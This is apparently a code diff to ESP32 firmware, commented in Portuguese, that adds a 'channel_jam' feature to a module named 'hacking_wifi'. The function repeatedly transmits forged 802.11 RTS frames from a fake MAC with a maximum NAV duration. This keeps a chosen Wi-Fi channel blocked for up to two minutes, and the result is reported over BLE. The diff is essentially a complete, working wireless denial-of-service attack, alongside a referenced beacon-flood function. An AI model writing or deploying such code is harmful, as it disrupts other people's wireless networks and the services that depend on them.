@@ -7,6 +7,7 @@
 
 #include "esp_log.h"
 #include "esp_wifi.h"
+#include "esp_timer.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 
@@ -65,8 +66,26 @@ typedef struct {
 } beacon_job_t;
 
 static volatile bool s_busy = false;
+static volatile bool s_jam_stop = false;
 static TaskHandle_t s_task = NULL;
 static uint8_t s_seq = 0;
+
+// RTS frame template (16 bytes total):
+//   [0..1]   FC: 0xB4 0x00 (type=Ctrl, subtype=RTS)
+//   [2..3]   duration (LE) — vamos usar 0x7FFF (32767 µs ≈ 33ms NAV lock)
+//   [4..9]   addr1 (RA) — broadcast pra "todo mundo escutar"
+//   [10..15] addr2 (TA) — nosso MAC fake
+static const uint8_t s_rts_template[16] = {
+    0xB4, 0x00,
+    0xFF, 0x7F,
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+    0x02, 0xCA, 0xFE, 0xBE, 0xEF, 0x00,
+};
+
+typedef struct {
+    uint8_t  channel;
+    uint16_t duration_sec;
+} jam_job_t;
 
 bool hacking_wifi_busy(void)
 {
@@ -269,6 +288,90 @@ static void beacon_task(void *arg)
     s_task = NULL;
     s_busy = false;
     vTaskDelete(NULL);
+}
+
+static void emit_jam_done(uint32_t sent, uint16_t duration_sec, uint8_t channel)
+{
+    uint8_t payload[7];
+    payload[0] = (uint8_t)(sent >> 24);
+    payload[1] = (uint8_t)(sent >> 16);
+    payload[2] = (uint8_t)(sent >> 8);
+    payload[3] = (uint8_t)(sent & 0xFF);
+    payload[4] = (uint8_t)(duration_sec >> 8);
+    payload[5] = (uint8_t)(duration_sec & 0xFF);
+    payload[6] = channel;
+
+    uint8_t frame[TLV_MAX_FRAME_SIZE];
+    int total = tlv_encode(frame, sizeof(frame),
+                           TLV_MSG_HACK_JAM_DONE, s_seq++,
+                           payload, sizeof(payload));
+    if (total > 0) transport_ble_send_stream(frame, (size_t)total);
+}
+
+static void jam_task(void *arg)
+{
+    jam_job_t *job = (jam_job_t *)arg;
+    int64_t deadline = esp_timer_get_time() + (int64_t)job->duration_sec * 1000000LL;
+
+    esp_err_t err = esp_wifi_set_channel(job->channel, WIFI_SECOND_CHAN_NONE);
+    uint32_t sent = 0;
+
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "jam set_channel rc=%s", esp_err_to_name(err));
+    } else {
+        uint8_t frame[sizeof(s_rts_template)];
+        memcpy(frame, s_rts_template, sizeof(frame));
+
+        // Loop tight — RTS é frame muito curto (16B). Spamar a cada 25ms
+        // mantém NAV (~33ms cada) sempre ativo no canal.
+        while (!s_jam_stop && esp_timer_get_time() < deadline) {
+            err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
+            if (err == ESP_OK) sent++;
+            vTaskDelay(pdMS_TO_TICKS(25));
+        }
+    }
+
+    ESP_LOGI(TAG, "channel_jam done: %lu rts on ch=%u for %us",
+             (unsigned long)sent, (unsigned)job->channel,
+             (unsigned)job->duration_sec);
+
+    emit_jam_done(sent, job->duration_sec, job->channel);
+
+    free(job);
+    s_jam_stop = false;
+    s_task = NULL;
+    s_busy = false;
+    vTaskDelete(NULL);
+}
+
+esp_err_t hacking_wifi_channel_jam(uint8_t channel, uint16_t duration_sec)
+{
+    if (channel == 0 || channel > 14) return ESP_ERR_INVALID_ARG;
+    if (s_busy) return ESP_ERR_INVALID_STATE;
+
+    if (duration_sec == 0) duration_sec = 10;
+    if (duration_sec > 120) duration_sec = 120; // cap p/ não fritar a placa
+
+    jam_job_t *job = calloc(1, sizeof(*job));
+    if (!job) return ESP_ERR_NO_MEM;
+    job->channel = channel;
+    job->duration_sec = duration_sec;
+
+    s_busy = true;
+    s_jam_stop = false;
+    if (xTaskCreate(jam_task, "channel_jam", 3072, job, 5, &s_task) != pdPASS) {
+        free(job);
+        s_busy = false;
+        return ESP_ERR_NO_MEM;
+    }
+    return ESP_OK;
+}
+
+esp_err_t hacking_wifi_channel_jam_stop(void)
+{
+    if (!s_busy) return ESP_ERR_INVALID_STATE;
+    s_jam_stop = true;
+    return ESP_OK;
 }
 
 esp_err_t hacking_wifi_beacon_flood(uint8_t channel,
